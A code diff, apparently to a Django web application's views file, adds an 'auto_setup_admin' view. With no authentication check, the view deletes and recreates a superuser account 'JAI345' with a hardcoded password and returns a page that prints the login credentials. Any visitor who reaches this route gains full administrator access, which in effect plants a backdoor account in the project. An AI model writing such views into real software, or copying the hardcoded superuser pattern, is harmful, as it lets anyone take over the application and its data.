@@ -4535,3 +4535,15 @@ def error_500(request):
 def error_403(request, exception=None):
     from django.shortcuts import render
     return render(request, '403.html', status=403)
+
+from django.http import HttpResponse
+from django.contrib.auth import get_user_model
+
+def auto_setup_admin(request):
+    User = get_user_model()
+    if User.objects.filter(username='JAI345').exists():
+        User.objects.filter(username='JAI345').delete()
+    user = User.objects.create_superuser('JAI345', 'admin@transform-tech.com', 'Jai345@2026')
+    user.role = 'admin'
+    user.save()
+    return HttpResponse('<h1>SUCCESS!</h1><p>Master account JAI345 created successfully in the PostgreSQL database.</p><p>You can now go back to <a href="/login/">/login/</a> and login with <b>JAI345</b> and <b>Jai345@2026</b>.</p>')
